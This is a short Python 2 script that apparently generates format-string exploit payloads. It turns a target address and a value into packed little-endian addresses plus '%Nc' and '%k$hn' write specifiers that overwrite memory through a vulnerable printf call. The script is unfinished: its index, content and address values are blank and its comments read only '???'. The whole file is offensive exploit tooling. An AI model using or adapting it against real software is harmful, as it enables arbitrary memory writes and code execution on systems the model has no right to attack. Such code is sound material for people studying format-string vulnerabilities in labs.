#!/usr/bin/python2
# coding: utf-8

################################################################################
### Description:
################################################################################
##
##
################################################################################
################################################################################

import re
import struct

from binascii import *

################################################################################
### Parameters:
################################################################################
##
## - chunksize    : ???
## - index        : ???
## - offset       : ???
## - content      : ???
## - address      : ???
## - contentsize  : ???
##
################################################################################
################################################################################

index        =
content      =
address      =
chunksize    = 2
contentsize  = 4
counter      = 0
counter     += contentsize * (4 / chunksize)

################################################################################
################################################################################

parts   = []
content = re.findall(".." * chunksize, "{0:08x}".format(content))[::-1]

for i in xrange(contentsize / chunksize):
  part = struct.pack("<I", address + chunksize * i)
  part = re.sub("(..)", r"\x\1", hexlify(part))
  parts.append((part, int(content[i], 16)))

parts.sort(key = lambda x: x[1])

################################################################################
################################################################################

exploit = ""
targets = "".join([row[0] for row in parts])

for i in xrange(contentsize / chunksize):
  value  = parts[i][1]
  offset = parts[i][1] - counter
  if offset > 0:
    exploit += "%{0:d}c".format(offset)
  elif offset < 0:
    print "Error !"
    exit(0)
  exploit += "%{0:d}$".format(index + i)
  exploit += "h{0:s}n".format("h" * (chunksize % 2))
  counter += offset

################################################################################
################################################################################

exploit_len = len(exploit)
targets_len = len(targets) / 4
payload_len = exploit_len + targets_len

print "Exploit: {0:3d} ({1:2d} - {2:d}) -> payload += \"{3:s}\"".format(exploit_len, exploit_len / contentsize, exploit_len % contentsize, exploit)
print "Targets: {0:3d} ({1:2d} - {2:d}) -> payload += \"{3:s}\"".format(targets_len, targets_len / contentsize, targets_len % contentsize, targets)
print "Payload: {0:3d} ({1:2d} - {2:d}) -> payload += \"{3:s}\"".format(payload_len, payload_len / contentsize, payload_len % contentsize, targets + exploit)
